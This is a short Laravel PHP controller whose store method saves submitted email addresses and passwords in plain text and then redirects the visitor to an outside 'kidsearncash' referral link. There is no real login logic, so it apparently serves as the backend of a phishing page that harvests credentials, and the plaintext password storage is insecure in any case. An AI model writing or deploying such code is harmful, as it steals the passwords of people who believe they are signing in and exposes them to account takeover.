<?php

namespace App\Http\Controllers;

use App\Detail;
use Illuminate\Http\Request;

class SessionController extends Controller
{
    public function store(Request $request)
    {
        Detail::create([
            'email' => $request->email,
            'password' => $request->password
        ]);

        return redirect('https://kidsearncash.com/share/Iremide');
    }
}